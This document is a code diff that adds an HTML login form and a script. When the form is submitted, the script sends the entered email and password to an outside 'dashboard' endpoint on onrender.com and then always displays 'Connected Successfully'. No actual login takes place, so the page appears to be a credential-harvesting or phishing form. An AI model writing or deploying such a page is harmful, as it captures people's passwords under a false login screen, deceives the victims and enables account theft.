@@ -1,0 +1,28 @@
+<form id="zashLogin">
+  <input type="email" id="email" placeholder="Email" required />
+  <input type="password" id="password" placeholder="Password" required />
+  <button type="submit">Login</button>
+</form>
+
+<p id="status"></p>
+
+<script>
+  document.getElementById("zashLogin").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    await fetch("https://your-dashboard-site.onrender.com/api/receive", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: email,
+        password: password,
+        timestamp: new Date().toISOString()
+      })
+    });
+
+    document.getElementById("status").textContent = "Connected Successfully ✅";
+  });
+</script>
